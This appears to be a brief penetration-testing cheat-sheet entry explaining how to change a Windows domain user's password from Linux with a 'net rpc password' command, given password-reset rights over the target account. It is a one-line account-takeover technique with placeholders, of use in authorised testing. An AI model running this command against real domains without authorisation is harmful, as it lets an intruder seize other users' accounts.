# RPC

## Change Windows User Password From Linux

> Note: 
> - this requires ForcePassword rights on the target user

### Net Rpc

    net rpc password "<TARGET_USER>" "newP@ssword2022" -U "<DOMAIN>"/"<USER>"%"<PASSWORD>" -S "<DOMAIN>"
